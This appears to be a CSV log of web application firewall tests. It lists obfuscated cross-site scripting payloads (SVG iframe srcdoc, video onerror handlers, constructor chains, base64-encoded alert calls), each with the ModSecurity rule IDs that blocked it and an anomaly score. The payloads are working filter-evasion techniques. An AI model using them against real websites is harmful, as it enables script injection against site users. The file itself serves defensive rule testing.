3660,"<svg><foreignObject requiredExtensions=""http://www.w3.org/1999/xhtml""><iframe srcdoc=""&lt;script&gt;[].constructor.constructor('al'+'ert(1)')()&lt;/script&gt;""></iframe></foreignObject></svg>",0,1,block,5,"941100,941110,941130,941160,949110","v217,191t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o86,8v217,191t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o62,6v217,191t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v217,191t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177827184291.806944
3663,"<svg><foreignObject requiredExtensions=""http://www.w3.org/1999/xhtml""><iframe srcdoc=""&lt;script&gt;window['a\x6cert'](1)&lt;/script&gt;""></iframe></foreignObject></svg>",0,1,block,6,"941100,941110,941130,941160,941370,949110","v217,169t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o86,8v217,169t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o62,6v217,169t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v217,169t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o100,18v217,169t:urlDecodeUni,t:compressWhitespace || ",25,177827184946.356427
3667,"<svg><foreignObject requiredExtensions=""http://www.w3.org/1999/xhtml""><iframe srcdoc=""&lt;script&gt;globalThis['e\u0076al'](globalThis['ato\u0062']('YWxlcnQoMSk='))&lt;/script&gt;""></iframe></foreignObject></svg>",0,1,block,5,"941100,941110,941130,941160,949110","v217,212t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o86,8v217,212t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o62,6v217,212t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v217,212t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177827185926.947490
3668,"<svg><foreignObject requiredExtensions=""http://www.w3.org/1999/xhtml""><iframe srcdoc=""&lt;script&gt;Reflect.apply(Reflect.get(window,'eval'),null,[Reflect.get(window,'atob').call(null,'YWxlcnQoMSk=')])&lt;/script&gt;""></iframe></foreignObject></svg>",0,1,block,5,"941100,941110,941130,941160,949110","v217,249t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o86,8v217,249t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o62,6v217,249t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v217,249t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177827186214.667748
3669,"<svg><foreignObject requiredExtensions=""http://www.w3.org/1999/xhtml""><iframe srcdoc=""&lt;script&gt;URL['constructor']['constructor']('ale'+'rt(1)')()&lt;/script&gt;""></iframe></foreignObject></svg>",0,1,block,6,"933210,941100,941110,941130,941160,949110","o103,47v217,198t:urlDecode,t:replaceComments,t:compressWhitespace || v217,198t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o86,8v217,198t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o62,6v217,198t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v217,198t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,17782718644.227765
3670,"<svg><foreignObject requiredExtensions=""http://www.w3.org/1999/xhtml""><iframe srcdoc=""&lt;script&gt;self['e\u{76}al'](self['a\u{74}ob']('YWxlcnQoMSk='))&lt;/script&gt;""></iframe></foreignObject></svg>",0,1,block,6,"941100,941110,941130,941160,941370,949110","v217,200t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o86,8v217,200t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o62,6v217,200t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v217,200t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o100,17v217,200t:urlDecodeUni,t:compressWhitespace || ",25,17782718667.826937
3671,"<svg><foreignObject requiredExtensions=""http://www.w3.org/1999/xhtml""><iframe srcdoc=""&lt;script&gt;[]['filter']['constructor']('ale'+'rt(1)')()&lt;/script&gt;""></iframe></foreignObject></svg>",0,1,block,6,"933210,941100,941110,941130,941160,949110","o100,44v217,192t:urlDecode,t:replaceComments,t:compressWhitespace || v217,192t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o86,8v217,192t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o62,6v217,192t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v217,192t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177827186912.213739
3674,"<svg><foreignObject requiredExtensions=""http://www.w3.org/1999/xhtml""><iframe srcdoc=""&lt;script&gt;(new Image).constructor.constructor('al'+'ert(1)')()&lt;/script&gt;""></iframe></foreignObject></svg>",0,1,block,5,"941100,941110,941130,941160,949110","v217,200t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o86,8v217,200t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o62,6v217,200t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v217,200t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177827187747.115892
3680,"<svg><foreignObject><div xmlns=""http://www.w3.org/1999/xhtml""><iframe srcdoc=""<script>Function('ale'+'rt(1)')();</script>""></iframe></div></foreignObject></svg>",0,1,block,5,"941100,941110,941130,941160,949110","v217,160t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o78,8v217,160t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o24,6v217,160t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v217,160t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177827189111.229139
3681,"<svg><foreignObject><div xmlns=""http://www.w3.org/1999/xhtml""><iframe srcdoc=""<script>[].constructor.constructor('ale'+'rt(1)')();</script>""></iframe></div></foreignObject></svg>",0,1,block,5,"941100,941110,941130,941160,949110","v217,178t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o78,8v217,178t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o24,6v217,178t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v217,178t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177827189416.296709
3682,"<svg><foreignObject><div xmlns=""http://www.w3.org/1999/xhtml""><iframe srcdoc=""<script>top['ev'+'al']('al'+'ert(1)');</script>""></iframe></div></foreignObject></svg>",0,1,block,7,"933210,941100,941110,941130,941160,941370,949110","o89,26v217,164t:urlDecode,t:replaceComments,t:compressWhitespace || v217,164t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o78,8v217,164t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o24,6v217,164t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v217,164t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o86,14v217,164t:urlDecodeUni,t:compressWhitespace || ",30,177827189623.373476
3683,"<svg><foreignObject><div xmlns=""http://www.w3.org/1999/xhtml""><iframe srcdoc=""<script>window['Function']('ale'+'rt(1)')();</script>""></iframe></div></foreignObject></svg>",0,1,block,7,"933210,941100,941110,941130,941160,941370,949110","o92,29v217,170t:urlDecode,t:replaceComments,t:compressWhitespace || v217,170t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o78,8v217,170t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o24,6v217,170t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v217,170t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o86,18v217,170t:urlDecodeUni,t:compressWhitespace || ",30,177827189866.524134
3686,"<svg><foreignObject><div xmlns=""http://www.w3.org/1999/xhtml""><iframe srcdoc=""<script>this['constr'+'uctor']['constr'+'uctor']('ale'+'rt(1)')();</script>""></iframe></div></foreignObject></svg>",0,1,block,7,"933210,941100,941110,941130,941160,941370,949110","o90,53v217,192t:urlDecode,t:replaceComments,t:compressWhitespace || v217,192t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o78,8v217,192t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o24,6v217,192t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v217,192t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o86,22v217,192t:urlDecodeUni,t:compressWhitespace || ",30,177827190694.036006
3688,"<svg><foreignObject><div xmlns=""http://www.w3.org/1999/xhtml""><iframe srcdoc=""<script>String.prototype.constructor.constructor('ale'+'rt(1)')();</script>""></iframe></div></foreignObject></svg>",0,1,block,5,"941100,941110,941130,941160,949110","v217,192t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o78,8v217,192t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o24,6v217,192t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v217,192t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177827191146.928869
3689,"<svg><foreignObject><div xmlns=""http://www.w3.org/1999/xhtml""><iframe srcdoc=""<script>top[String.fromCharCode(101,118,97,108)](String.fromCharCode(97,108,101,114,116,40,49,41));</script>""></iframe></div></foreignObject></svg>",0,1,block,7,"934100,941100,941110,941130,941160,941370,949110","o90,19v217,225 || v217,225t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o78,8v217,225t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o24,6v217,225t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v217,225t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o86,40v217,225t:urlDecodeUni,t:compressWhitespace || ",30,177827191455.905358
3691,"<svg><foreignObject><div xmlns=""http://www.w3.org/1999/xhtml""><iframe srcdoc=""<script>window[`Fun`+`ction`](`ale`+`rt(1)`)();</script>""></iframe></div></foreignObject></svg>",0,1,block,6,"941100,941110,941130,941160,941370,949110","v217,173t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o78,8v217,173t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o24,6v217,173t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v217,173t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o86,21v217,173t:urlDecodeUni,t:compressWhitespace || ",25,177827191824.491127
3692,"<svg><foreignObject><div xmlns=""http://www.w3.org/1999/xhtml""><iframe srcdoc=""<script>Array.constructor.constructor('ale'+'rt(1)')();</script>""></iframe></div></foreignObject></svg>",0,1,block,5,"941100,941110,941130,941160,949110","v217,181t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o78,8v217,181t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o24,6v217,181t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v217,181t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177827192134.960426
3693,"<svg><foreignObject><div xmlns=""http://www.w3.org/1999/xhtml""><iframe srcdoc=""<script>RegExp.constructor.constructor('ale'+'rt(1)')();</script>""></iframe></div></foreignObject></svg>",0,1,block,5,"941100,941110,941130,941160,949110","v217,182t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o78,8v217,182t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o24,6v217,182t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v217,182t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177827192390.904116
3694,"<svg><foreignObject><div xmlns=""http://www.w3.org/1999/xhtml""><iframe srcdoc=""<script>Error.constructor.constructor('ale'+'rt(1)')();</script>""></iframe></div></foreignObject></svg>",0,1,block,5,"941100,941110,941130,941160,949110","v217,181t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o78,8v217,181t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o24,6v217,181t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v217,181t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177827192617.563470
3695,"<svg><foreignObject><div xmlns=""http://www.w3.org/1999/xhtml""><iframe srcdoc=""<script>isNaN.constructor('ale'+'rt(1)')();</script>""></iframe></div></foreignObject></svg>",0,1,block,5,"941100,941110,941130,941160,949110","v217,169t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o78,8v217,169t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o24,6v217,169t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v217,169t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177827192815.833814
3696,"<svg><foreignObject><div xmlns=""http://www.w3.org/1999/xhtml""><iframe srcdoc=""<script>parseFloat.constructor('ale'+'rt(1)')();</script>""></iframe></div></foreignObject></svg>",0,1,block,5,"941100,941110,941130,941160,949110","v217,174t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o78,8v217,174t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o24,6v217,174t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v217,174t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177827193025.753534
3697,"<svg><foreignObject><div xmlns=""http://www.w3.org/1999/xhtml""><iframe srcdoc=""<script>decodeURI.constructor('ale'+'rt(1)')();</script>""></iframe></div></foreignObject></svg>",0,1,block,5,"941100,941110,941130,941160,949110","v217,173t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o78,8v217,173t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o24,6v217,173t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v217,173t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,17782719320.068531
3698,"<svg><foreignObject><div xmlns=""http://www.w3.org/1999/xhtml""><iframe srcdoc=""<script>unescape.constructor('ale'+'rt(1)')();</script>""></iframe></div></foreignObject></svg>",0,1,block,5,"941100,941110,941130,941160,949110","v217,172t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o78,8v217,172t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o24,6v217,172t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v217,172t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177827193511.409733
3699,"<svg><foreignObject><div xmlns=""http://www.w3.org/1999/xhtml""><iframe srcdoc=""<script>escape.constructor('ale'+'rt(1)')();</script>""></iframe></div></foreignObject></svg>",0,1,block,5,"941100,941110,941130,941160,949110","v217,170t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o78,8v217,170t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o24,6v217,170t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v217,170t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177827193778.609668
3746,"<video src onerror=""top['Function']['prototype']['constructor']['constructor'](atob('YWxlcnQoMSk='))()"">",0,1,block,6,"933210,941100,941120,941160,941370,949110","o23,79v217,104t:urlDecode,t:replaceComments,t:compressWhitespace || v217,104t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o10,9v217,104t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,19v217,104t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o20,15v217,104t:urlDecodeUni,t:compressWhitespace || ",25,177827205226.468634
3747,"<svg onload=""parent['Function'](atob('YWxlcnQoMSk='))()"">",0,1,block,5,"933210,941100,941120,941160,949110","o19,36v217,57t:urlDecode,t:replaceComments,t:compressWhitespace || v217,57t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,57t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,57t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177827205444.435886
3758,"<video src onerror=""(0,self['Function'])(atob('YWxlcnQoMSk='))()"">",0,1,block,6,"933210,941100,941120,941160,941370,949110","o27,37v217,66t:urlDecode,t:replaceComments,t:compressWhitespace || v217,66t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o10,9v217,66t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,19v217,66t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o23,16v217,66t:urlDecodeUni,t:compressWhitespace || ",25,177827208132.900185
3760,"<video src onerror='(Function.prototype.constructor.call(null,atob(""YWxlcnQoMSk="")))()'>",0,1,block,4,"941100,941120,941160,949110","v217,88t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o10,9v217,88t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,19v217,88t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177827208664.250015
3768,"<video src onerror='(parent[""Function""][""constructor""](atob(""YWxlcnQoMSk=""))())'>",0,1,block,5,"933210,941100,941120,941160,949110","o20,59v217,81t:urlDecode,t:replaceComments,t:compressWhitespace || v217,81t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o10,9v217,81t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,19v217,81t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177827210525.282621
3775,"<video src onerror='(Reflect[""construct""](Function,[atob(""YWxlcnQoMSk="")]))()'>",0,1,block,5,"933210,941100,941120,941160,949110","o20,57v217,79t:urlDecode,t:replaceComments,t:compressWhitespace || v217,79t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o10,9v217,79t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,19v217,79t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177827212283.176762
3800,"<video><source onerror=""(function(){this['constru'+'ctor']['constru'+'ctor']('al'+'ert(1)')()})()""></video>",0,1,block,8,"933210,934100,934100,941100,941120,941160,941370,949110","o24,73v217,107t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,107 || o25,11v217,107t:urlDecodeUni || v217,107t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o14,9v217,107t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,23v217,107t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o36,22v217,107t:urlDecodeUni,t:compressWhitespace || ",35,177827218248.287821
3815,"<video><source onerror=""(()=>{Reflect['constru'+'ct'](Reflect['get']([]['fill'],'const'+'ructor'),['ale'+'rt(1)'])()})()""></video>",0,1,block,5,"933210,941100,941120,941160,949110","o37,83v217,130t:urlDecode,t:replaceComments,t:compressWhitespace || v217,130t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o14,9v217,130t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,23v217,130t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177827221935.125081
3817,"<video><source onerror=""(()=>{(function(){})['constru'+'ctor']['constru'+'ctor'](atob('YWxlcnQoMSk='))()})()""></video>",0,1,block,8,"932100,933210,934100,934100,941100,941120,941160,949110","o29,10v217,118 || o30,78v217,118t:urlDecode,t:replaceComments,t:compressWhitespace || o31,11v217,118 || o31,11v217,118t:urlDecodeUni || v217,118t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o14,9v217,118t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,23v217,118t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",35,17782722236.989309
3818,"<video><source onerror=""((function(){self['e\u0076\u0061\u006c']('a'+'l'+'e'+'r'+'t'+'('+'1'+')')})())""></video>",0,1,block,8,"933210,934100,934100,941100,941120,941160,941370,949110","o64,38v217,112t:urlDecode,t:replaceComments,t:compressWhitespace || o26,11v217,112 || o26,11v217,112t:urlDecodeUni || v217,112t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o14,9v217,112t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,23v217,112t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o37,27v217,112t:urlDecodeUni,t:compressWhitespace || ",35,177827222614.932655
3822,"<video><source onerror=""(''['__proto__']['constructor']['constructor']('al'+'ert(1)'))()""></video>",0,1,block,5,"933210,941100,941120,941160,949110","o24,64v217,98t:urlDecode,t:replaceComments,t:compressWhitespace || v217,98t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o14,9v217,98t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,23v217,98t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,17782722356.938425
3844,"<video><source onerror='({}[""__proto__""][""constructor""][""constructor""](""retu""+""rn al""+""ert(1)""))()' src='#'></video>",0,1,block,5,"933210,941100,941120,941160,949110","o24,74v217,116t:urlDecode,t:replaceComments,t:compressWhitespace || v217,116t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o14,9v217,116t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,104v217,116t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177827228929.112735
3859,"<video><source onerror='(Reflect[""construct""]([][""find""][""constructor""],[""retur""+""n ale""+""rt(1)""]))()' src='#'></video>",0,1,block,5,"933210,941100,941120,941160,949110","o24,77v217,119t:urlDecode,t:replaceComments,t:compressWhitespace || v217,119t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o14,9v217,119t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,107v217,119t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177827232529.218088
